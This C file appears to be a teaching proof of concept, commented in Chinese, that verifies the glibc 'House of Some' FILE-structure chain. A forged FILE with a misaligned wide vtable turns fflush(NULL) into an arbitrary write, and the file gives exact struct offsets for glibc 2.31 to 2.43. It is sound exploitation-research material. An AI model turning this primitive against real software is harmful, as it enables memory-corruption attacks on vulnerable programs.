#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
 * House of Some 消费链验证：glibc 2.31～2.43 / x86-64。
 *
 * 真实的调用链是这样走的：
 *   fflush(NULL) -> _IO_flush_all -> _IO_wfile_overflow
 *   -> 进入 _IO_wdoallocbuf，再通过错位的宽字符虚表调用 doallocate，
 *   -> 最终经 _IO_new_file_underflow 与 _IO_file_read 执行 read(fd, target, len)。
 *
 * 这份 PoC 用 dlsym 代替真实题目里的 libc 泄露，用直接改写 _IO_list_all
 * 代替把伪造数据投递到堆上的原语。最后一定要用 memcmp 证明 fd 里的数据
 * 确实写进了 target，才算这条链真正跑通。
 */

#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static const char supplied[] = "HOUSE-OF-SOME:RWRWR";
    unsigned char target[sizeof(supplied)];
    unsigned char lock_storage[64];
    unsigned char wide[0x100] __attribute__((aligned(0x10)));
    struct fake_file_plus fake;
    void **list_slot;
    void *saved_list;
    const unsigned char *file_jumps;
    const void *wfile_jumps;
    void *prevchain;
    int fds[2];

    assert(sizeof(FILE) == 0xd8);
    memset(target, 0, sizeof(target));
    memset(lock_storage, 0, sizeof(lock_storage));
    memset(wide, 0, sizeof(wide));
    memset(&fake, 0, sizeof(fake));

    list_slot = (void **)dlsym(RTLD_DEFAULT, "_IO_list_all");
    file_jumps =
        (const unsigned char *)dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(list_slot != NULL && file_jumps != NULL && wfile_jumps != NULL);
    saved_list = *list_slot;

    assert(pipe(fds) == 0);
    assert(write(fds[1], supplied, sizeof(supplied)) ==
           (ssize_t)sizeof(supplied));
    close(fds[1]);

    fake.file._flags = IO_LINKED;       /* 节点已被“投递”进 _IO_list_all。 */
    fake.file._chain = NULL;            /* 教学 PoC 只演示 RWRWR 的第一跳。 */
    fake.file._fileno = fds[0];
    fake.file._lock = lock_storage;
    fake.file._mode = 2;                /* 让 flush 检查 wide write 区间。 */
    /* 统一构建镜像的旧公开头隐藏了该内部字段；x86-64 ABI 槽位是 +0xa0。 */
    *(void **)((unsigned char *)&fake.file + 0xa0) = wide;

    /* underflow 会把 fd 数据写到 [_IO_buf_base, _IO_buf_end)。 */
    fake.file._IO_read_base = (char *)target;
    fake.file._IO_read_ptr = (char *)target;
    fake.file._IO_read_end = (char *)target;
    fake.file._IO_write_base = (char *)target;
    fake.file._IO_write_ptr = (char *)target;
    fake.file._IO_write_end = (char *)target + sizeof(target);
    fake.file._IO_buf_base = (char *)target;
    fake.file._IO_buf_end = (char *)target + sizeof(target);

    /* primary overflow 必须是合法的 _IO_wfile_overflow。 */
    fake.vtable = wfile_jumps;

    /*
     * 2.31+ 的 _IO_wide_data->_wide_vtable 位于 +0xe0。
     * wide[+0x18]=0 且 wide[+0x20]=1：满足 flush 的宽写区间条件；
     * wide[+0x30]=0：令 _IO_wdoallocbuf 进入 WDOALLOCATE。
     *
     * wide doallocate 槽偏移为 +0x68，因此：
     *   错位虚表地址加槽偏移为 (_IO_file_jumps - 0x48) + 0x68，
     *   化简后等于 _IO_file_jumps + 0x20，
     *   该位置存放的目标函数正是 _IO_new_file_underflow。
     */
    *(void **)(wide + 0x18) = NULL;
    *(void **)(wide + 0x20) = (void *)1;
    *(void **)(wide + 0x30) = NULL;
    *(void **)(wide + 0xe0) = (void *)(file_jumps - 0x48);

    /* glibc 2.40 起 +0xb8 是 _prevchain；旧 GCC 头仍把它叫 __pad5。 */
    prevchain = list_slot;
    memcpy((unsigned char *)&fake.file + 0xb8,
           &prevchain, sizeof(prevchain));

    *list_slot = &fake;
    (void)fflush(NULL);
    *list_slot = saved_list;
    close(fds[0]);

    assert(memcmp(target, supplied, sizeof(supplied)) == 0);
    dprintf(STDERR_FILENO,
            "[+] House of Some：wide doallocate -> underflow 任意写成功（%zu 字节）\n",
            sizeof(supplied));
    return 0;
}
